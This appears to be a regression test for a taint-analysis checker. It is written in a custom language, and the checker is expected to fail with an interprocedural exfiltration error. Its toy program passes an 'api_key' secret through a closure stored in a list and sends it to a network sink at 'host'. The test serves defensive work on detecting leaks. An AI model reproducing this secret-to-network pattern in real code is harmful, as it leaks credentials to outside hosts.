// EXPECT: FAIL
// ERROR_CONTAINS: ANUBIS_INTERPROC_EXFILTRATION
// Soundness (residual 2026-07-20), sink-side dual: a param captured in a closure that is stored in a
// container and then applied to a sink INSIDE the fn was invisible to the param->sink summary
// (`expr_param_flow` fell through Expr::Lambda to empty). FIX: matching Lambda arm in expr_param_flow.
fn log(p) uses(net.send) {
    let c = [|x| p];
    send("host", 80, c[0](0));
}
fn main() uses(net.send) {
    let k = secret_source("api_key");
    log(k);
}
